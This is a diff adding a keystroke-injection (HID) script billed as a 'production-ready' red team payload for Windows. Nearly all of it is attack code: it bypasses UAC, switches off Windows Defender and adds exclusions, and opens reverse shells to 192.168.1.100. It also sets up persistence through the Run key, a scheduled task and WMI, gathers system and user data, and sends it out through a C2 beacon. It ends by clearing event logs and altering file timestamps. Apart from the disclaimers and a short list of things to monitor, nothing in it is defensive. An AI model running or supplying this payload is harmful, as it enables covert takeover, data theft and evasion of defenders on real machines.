@@ -1,0 +1,417 @@
+# 🔴 Access and Evasion - Production Red Team Payload
+# Happy Frog Script for Initial Access and Defensive Evasion
+# 
+# WARNING: This is a production-ready payload for authorized testing only
+# Use only on systems you own or have explicit written permission to test
+# This payload is designed to bypass common defensive measures
+#
+# Educational Purpose: Realistic red team testing for:
+# - Initial access via HID devices
+# - UAC bypass and privilege escalation
+# - Antivirus evasion and stealth operations
+# - Persistence establishment
+# - Command and control setup
+# - Defensive evasion techniques
+#
+# ⚠️ CRITICAL: AUTHORIZED TESTING ONLY
+# This demonstrates realistic attack vectors for educational and authorized testing
+
+# ========================================
+# SECTION 1: STEALTH INITIALIZATION
+# ========================================
+
+# Enable production mode for immediate execution
+ATTACKMODE HID
+
+# Set minimal delays for rapid execution while maintaining reliability
+DEFAULT_DELAY 75
+
+# Wait for system recognition and USB enumeration
+DELAY 2000
+
+# ========================================
+# SECTION 2: UAC BYPASS AND PRIVILEGE ESCALATION
+# ========================================
+
+# Method 1: Fodhelper UAC bypass (Windows 10/11)
+MOD r
+DELAY 300
+STRING fodhelper
+ENTER
+DELAY 1000
+
+# Wait for Fodhelper to open, then use it to launch elevated PowerShell
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -WindowStyle Hidden"
+ENTER
+DELAY 1500
+
+# Alternative Method 2: ComputerDefaults UAC bypass if Fodhelper fails
+STRING exit
+ENTER
+DELAY 500
+
+MOD r
+DELAY 300
+STRING computerdefaults
+ENTER
+DELAY 1000
+
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -WindowStyle Hidden"
+ENTER
+DELAY 1500
+
+# Method 3: Registry-based UAC bypass as fallback
+STRING exit
+ENTER
+DELAY 500
+
+MOD r
+DELAY 300
+STRING cmd /c "reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f"
+ENTER
+DELAY 200
+
+STRING cmd /c "reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "" /t REG_SZ /d "powershell.exe -WindowStyle Hidden" /f"
+ENTER
+DELAY 200
+
+STRING computerdefaults
+ENTER
+DELAY 1000
+
+# Clean up registry modifications
+STRING cmd /c "reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /f"
+ENTER
+DELAY 200
+
+# ========================================
+# SECTION 3: ANTIVIRUS EVASION AND STEALTH
+# ========================================
+
+# Disable Windows Defender real-time monitoring
+STRING Set-MpPreference -DisableRealtimeMonitoring $true -Force
+ENTER
+DELAY 300
+
+# Disable Windows Defender behavior monitoring
+STRING Set-MpPreference -DisableBehaviorMonitoring $true -Force
+ENTER
+DELAY 300
+
+# Disable Windows Defender IOAV protection
+STRING Set-MpPreference -DisableIOAVProtection $true -Force
+ENTER
+DELAY 300
+
+# Disable Windows Defender cloud protection
+STRING Set-MpPreference -MAPSReporting Disabled -Force
+ENTER
+DELAY 300
+
+# Add exclusions for our working directory
+STRING Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows\Update" -Force
+ENTER
+DELAY 200
+
+STRING Add-MpPreference -ExclusionPath "$env:APPDATA\Windows" -Force
+ENTER
+DELAY 200
+
+STRING Add-MpPreference -ExclusionPath "$env:TEMP\Windows" -Force
+ENTER
+DELAY 200
+
+# ========================================
+# SECTION 4: ESTABLISH REVERSE SHELL
+# ========================================
+
+# Create hidden directory structure first
+STRING New-Item -Path "$env:APPDATA\Microsoft\Windows\Update" -ItemType Directory -Force
+ENTER
+DELAY 200
+
+STRING New-Item -Path "$env:APPDATA\Microsoft\Windows\Update\data" -ItemType Directory -Force
+ENTER
+DELAY 200
+
+STRING New-Item -Path "$env:APPDATA\Microsoft\Windows\Update\logs" -ItemType Directory -Force
+ENTER
+DELAY 200
+
+# Set directories to hidden
+STRING attrib +h "$env:APPDATA\Microsoft\Windows\Update"
+ENTER
+DELAY 200
+
+STRING attrib +h "$env:APPDATA\Microsoft\Windows\Update\data"
+ENTER
+DELAY 200
+
+STRING attrib +h "$env:APPDATA\Microsoft\Windows\Update\logs"
+ENTER
+DELAY 200
+
+# Execute reverse shell directly in current session with error handling
+STRING try { $ports = @(4444, 4445, 8080, 8443, 443); foreach($port in $ports) { try { $client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", $port); $stream = $client.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true; while($true) { $command = $reader.ReadLine(); if($command -eq "exit") { break }; if($command -eq "kill") { exit }; $output = Invoke-Expression $command 2>&1; $writer.WriteLine($output) } $client.Close(); break } catch { continue } } } catch { "Reverse shell failed, continuing with persistence setup" | Out-File "$env:APPDATA\Microsoft\Windows\Update\logs\reverse_shell_failed.log" -Append }
+ENTER
+DELAY 500
+
+# Create persistent reverse shell script for background execution
+STRING $reverseShellScript = 'while($true) { try { $ports = @(4444, 4445, 8080, 8443, 443); foreach($port in $ports) { try { $client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", $port); $stream = $client.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true; while($true) { $command = $reader.ReadLine(); if($command -eq "exit") { break }; if($command -eq "kill") { exit }; $output = Invoke-Expression $command 2>&1; $writer.WriteLine($output) } $client.Close(); break } catch { continue } } } catch { Start-Sleep -Seconds 30 } }'
+ENTER
+DELAY 300
+
+STRING Set-Content -Path "$env:APPDATA\Microsoft\Windows\Update\shell.ps1" -Value $reverseShellScript -Force
+ENTER
+DELAY 300
+
+# Start reverse shell in background
+STRING Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\Update\shell.ps1`""
+ENTER
+DELAY 500
+
+# ========================================
+# SECTION 5: ESTABLISH PERSISTENCE
+# ========================================
+
+# Create persistence script
+STRING $persistScript = 'Start-Sleep -Seconds 30; while($true) { try { $ports = @(4444, 4445, 8080, 8443, 443); foreach($port in $ports) { try { $client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", $port); $stream = $client.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true; while($true) { $command = $reader.ReadLine(); if($command -eq "exit") { break }; if($command -eq "kill") { exit }; $output = Invoke-Expression $command 2>&1; $writer.WriteLine($output) } $client.Close(); break } catch { continue } } } catch { Start-Sleep -Seconds 60 } }'
+ENTER
+DELAY 300
+
+STRING Set-Content -Path "$env:APPDATA\Microsoft\Windows\Update\persist.ps1" -Value $persistScript -Force
+ENTER
+DELAY 300
+
+# Create startup persistence via registry
+STRING New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\Update\persist.ps1`"" -PropertyType String -Force
+ENTER
+DELAY 300
+
+# Create defender persistence script
+STRING $defenderScript = 'Start-Sleep -Seconds 60; while($true) { try { $client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4445); $stream = $client.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true; while($true) { $command = $reader.ReadLine(); if($command -eq "exit") { break }; if($command -eq "kill") { exit }; $output = Invoke-Expression $command 2>&1; $writer.WriteLine($output) } } catch { Start-Sleep -Seconds 60 } }'
+ENTER
+DELAY 300
+
+STRING Set-Content -Path "$env:APPDATA\Microsoft\Windows\Update\defender.ps1" -Value $defenderScript -Force
+ENTER
+DELAY 300
+
+# Create scheduled task for additional persistence
+STRING schtasks /create /tn "WindowsDefender" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\Update\defender.ps1`"" /sc onlogon /ru System /f
+ENTER
+DELAY 400
+
+# Create WMI persistence script
+STRING $wmiScript = 'Start-Sleep -Seconds 90; while($true) { try { $client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4446); $stream = $client.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true; while($true) { $command = $reader.ReadLine(); if($command -eq "exit") { break }; if($command -eq "kill") { exit }; $output = Invoke-Expression $command 2>&1; $writer.WriteLine($output) } } catch { Start-Sleep -Seconds 90 } }'
+ENTER
+DELAY 300
+
+STRING Set-Content -Path "$env:APPDATA\Microsoft\Windows\Update\wmi.ps1" -Value $wmiScript -Force
+ENTER
+DELAY 300
+
+# Create WMI persistence using correct syntax
+STRING $wmiPersistence = 'try { $filter = New-Object -ComObject WbemScripting.SWbemFilter; $filter.EventNameSpace = "root\cimv2"; $filter.QueryLanguage = "WQL"; $filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_LocalTime\""; $consumer = New-Object -ComObject WbemScripting.SWbemConsumer; $consumer.Name = "WindowsUpdate"; $consumer.CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"$env:APPDATA\Microsoft\Windows\Update\wmi.ps1\""; $filter.ConnectEventConsumer($consumer) } catch { "WMI persistence failed" | Out-File "$env:APPDATA\Microsoft\Windows\Update\logs\wmi_failed.log" -Append }'
+ENTER
+DELAY 500
+
+STRING Set-Content -Path "$env:APPDATA\Microsoft\Windows\Update\wmi_setup.ps1" -Value $wmiPersistence -Force
+ENTER
+DELAY 300
+
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:APPDATA\Microsoft\Windows\Update\wmi_setup.ps1"
+ENTER
+DELAY 500
+
+# ========================================
+# SECTION 6: INFORMATION GATHERING
+# ========================================
+
+# Gather comprehensive system information with error handling
+STRING try { $sysinfo = @{ 'hostname' = $env:COMPUTERNAME; 'username' = $env:USERNAME; 'domain' = $env:USERDOMAIN; 'os' = (Get-WmiObject -Class Win32_OperatingSystem).Caption; 'architecture' = (Get-WmiObject -Class Win32_ComputerSystem).SystemType; 'memory' = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2); 'processors' = (Get-WmiObject -Class Win32_Processor).NumberOfCores; 'uptime' = (Get-Date) - (Get-WmiObject -Class Win32_OperatingSystem).LastBootUpTime; 'timestamp' = Get-Date -Format "yyyy-MM-dd HH:mm:ss" } } catch { $sysinfo = @{ 'error' = 'Failed to gather system info'; 'timestamp' = (Get-Date).ToString() } }
+ENTER
+DELAY 300
+
+# Gather network information with error handling
+STRING try { $netinfo = @{ 'interfaces' = Get-NetIPAddress | Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*' } | Select-Object IPAddress, InterfaceAlias; 'routes' = Get-NetRoute | Where-Object { $_.DestinationPrefix -ne '0.0.0.0/0' } | Select-Object DestinationPrefix, NextHop; 'dns' = Get-DnsClientServerAddress | Select-Object ServerAddresses; 'arp' = Get-NetNeighbor | Select-Object IPAddress, LinkLayerAddress, State } } catch { $netinfo = @{ 'error' = 'Failed to gather network info' } }
+ENTER
+DELAY 300
+
+# Gather user and group information with error handling
+STRING try { $userinfo = @{ 'local_users' = Get-LocalUser | Select-Object Name, Enabled, PasswordExpires, LastLogon; 'local_groups' = Get-LocalGroup | Select-Object Name, Description; 'admin_users' = Get-LocalGroupMember -Group "Administrators" | Select-Object Name, PrincipalSource; 'current_user_groups' = (Get-LocalGroup | ForEach-Object { Get-LocalGroupMember -Group $_.Name | Where-Object { $_.Name -like "*$env:USERNAME*" } | Select-Object @{Name='Group';Expression={$_.Group}}, @{Name='Member';Expression={$_.Name}} }) } } catch { $userinfo = @{ 'error' = 'Failed to gather user info' } }
+ENTER
+DELAY 300
+
+# Gather process and service information with error handling
+STRING try { $processinfo = @{ 'processes' = Get-Process | Select-Object Name, Id, CPU, WorkingSet, StartTime | Sort-Object CPU -Descending | Select-Object -First 20; 'services' = Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object Name, DisplayName, Status, StartType; 'startup_programs' = Get-CimInstance -ClassName Win32_StartupCommand | Select-Object Name, Command, Location } } catch { $processinfo = @{ 'error' = 'Failed to gather process info' } }
+ENTER
+DELAY 300
+
+# Save all information to hidden file
+STRING $allinfo = @{ 'system' = $sysinfo; 'network' = $netinfo; 'users' = $userinfo; 'processes' = $processinfo }
+ENTER
+DELAY 200
+
+STRING $allinfo | ConvertTo-Json -Depth 10 | Out-File "$env:APPDATA\Microsoft\Windows\Update\system_info.json" -Force
+ENTER
+DELAY 300
+
+# ========================================
+# SECTION 7: ESTABLISH COVERT CHANNELS
+# ========================================
+
+# Create data collection script with error handling
+STRING $dataCollector = 'while($true) { try { $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; $processes = Get-Process | Select-Object Name, Id, CPU, WorkingSet, StartTime | ConvertTo-Json; $connections = Get-NetTCPConnection | Where-Object { $_.State -eq "Listen" -or $_.State -eq "Established" } | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State | ConvertTo-Json; $recentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 10 Name, FullName, LastWriteTime | ConvertTo-Json; $data = @{ "timestamp" = $timestamp; "processes" = $processes; "connections" = $connections; "recent_files" = $recentFiles }; $data | ConvertTo-Json -Depth 5 | Out-File "$env:APPDATA\Microsoft\Windows\Update\data\collection_$timestamp.json" -Force; $files = Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Update\data" -File | Sort-Object LastWriteTime -Descending | Select-Object -Skip 10; $files | Remove-Item -Force; Start-Sleep -Seconds 300 } catch { Start-Sleep -Seconds 300 } }'
+ENTER
+DELAY 500
+
+STRING Set-Content -Path "$env:APPDATA\Microsoft\Windows\Update\collector.ps1" -Value $dataCollector -Force
+ENTER
+DELAY 300
+
+# Start data collection in background
+STRING Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\Update\collector.ps1`""
+ENTER
+DELAY 500
+
+# ========================================
+# SECTION 8: ESTABLISH COMMAND & CONTROL
+# ========================================
+
+# Create C2 communication script with multiple protocols and error handling
+STRING $c2Script = 'function Send-Data { param($data, $target = "192.168.1.100"); try { $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }; $body = @{ "data" = $data; "timestamp" = (Get-Date).ToString() } | ConvertTo-Json; Invoke-RestMethod -Uri "http://$target:8080/beacon" -Method POST -Headers $headers -Body $body -TimeoutSec 10; return $true } catch { try { $client = New-Object System.Net.Sockets.TCPClient($target, 4446); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true; $writer.WriteLine($data); $client.Close(); return $true } catch { return $false } } } while($true) { try { $hostname = $env:COMPUTERNAME; $username = $env:USERNAME; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.*" }).IPAddress[0]; $uptime = (Get-Date) - (Get-WmiObject -Class Win32_OperatingSystem).LastBootUpTime; $status = @{ "hostname" = $hostname; "username" = $username; "ip" = $ip; "uptime" = $uptime.TotalHours; "timestamp" = (Get-Date).ToString(); "status" = "active"; "version" = "1.0" }; $success = Send-Data ($status | ConvertTo-Json); if($success) { $status | ConvertTo-Json | Out-File "$env:APPDATA\Microsoft\Windows\Update\logs\c2_success.log" -Append } else { "Failed to communicate at $(Get-Date)" | Out-File "$env:APPDATA\Microsoft\Windows\Update\logs\c2_failed.log" -Append } Start-Sleep -Seconds 300 } catch { Start-Sleep -Seconds 300 } }'
+ENTER
+DELAY 500
+
+STRING Set-Content -Path "$env:APPDATA\Microsoft\Windows\Update\c2.ps1" -Value $c2Script -Force
+ENTER
+DELAY 300
+
+# Start C2 communication
+STRING Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\Update\c2.ps1`""
+ENTER
+DELAY 500
+
+# ========================================
+# SECTION 9: DEFENSIVE EVASION
+# ========================================
+
+# Clear PowerShell history
+STRING Clear-History
+ENTER
+DELAY 200
+
+# Clear command history
+STRING Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+ENTER
+DELAY 200
+
+# Clear recent files
+STRING Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
+ENTER
+DELAY 200
+
+# Clear temporary files
+STRING Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
+ENTER
+DELAY 200
+
+# Clear Windows event logs (requires admin)
+STRING wevtutil cl System
+ENTER
+DELAY 300
+
+STRING wevtutil cl Security
+ENTER
+DELAY 300
+
+STRING wevtutil cl Application
+ENTER
+DELAY 300
+
+# Disable Windows Defender logging
+STRING Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -MAPSReporting Disabled -Force
+ENTER
+DELAY 300
+
+# Modify file timestamps to blend in
+STRING (Get-Item "$env:APPDATA\Microsoft\Windows\Update").LastWriteTime = (Get-Date).AddDays(-30)
+ENTER
+DELAY 200
+
+STRING (Get-Item "$env:APPDATA\Microsoft\Windows\Update\shell.ps1").LastWriteTime = (Get-Date).AddDays(-15)
+ENTER
+DELAY 200
+
+# ========================================
+# SECTION 10: FINAL PERSISTENCE VERIFICATION
+# ========================================
+
+# Verify persistence mechanisms
+STRING Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate"
+ENTER
+DELAY 200
+
+STRING Get-ScheduledTask -TaskName "WindowsDefender" -ErrorAction SilentlyContinue
+ENTER
+DELAY 200
+
+# Check if our processes are running
+STRING Get-Process | Where-Object { $_.ProcessName -eq 'powershell' } | Select-Object Id, ProcessName, StartTime
+ENTER
+DELAY 300
+
+# Create status report
+STRING $finalStatus = @{ 'initial_access' = 'completed'; 'uac_bypass' = 'successful'; 'antivirus_evasion' = 'completed'; 'reverse_shell' = 'established'; 'persistence' = 'configured'; 'c2' = 'active'; 'stealth' = 'enabled'; 'timestamp' = (Get-Date).ToString(); 'version' = '1.0' }
+ENTER
+DELAY 200
+
+STRING $finalStatus | ConvertTo-Json | Out-File "$env:APPDATA\Microsoft\Windows\Update\status.json" -Force
+ENTER
+DELAY 200
+
+# ========================================
+# SECTION 11: CLEANUP AND EXIT
+# ========================================
+
+# Minimize all windows to hide activity
+STRING (New-Object -ComObject Shell.Application).MinimizeAll()
+ENTER
+DELAY 200
+
+# Clear screen
+STRING Clear-Host
+ENTER
+DELAY 100
+
+# Final cleanup - close PowerShell window
+STRING exit
+ENTER
+
+# ========================================
+# PAYLOAD COMPLETE
+# ========================================
+#
+# This payload provides:
+# 1. Multiple UAC bypass methods
+# 2. Comprehensive antivirus evasion
+# 3. Reverse shell with fallback ports
+# 4. Multiple persistence mechanisms
+# 5. Covert data collection
+# 6. Command and control communication
+# 7. Defensive evasion techniques
+# 8. Stealth operations
+#
+# For testing against your defenses, monitor:
+# - Process creation and execution
+# - Network connections and traffic
+# - Registry modifications
+# - File system changes
+# - Scheduled task creation
+# - Windows Defender exclusions
+# - Event log entries
+# - PowerShell execution
+#
+# Remember: This is for AUTHORIZED TESTING ONLY
+# Always obtain proper authorization before security testing 
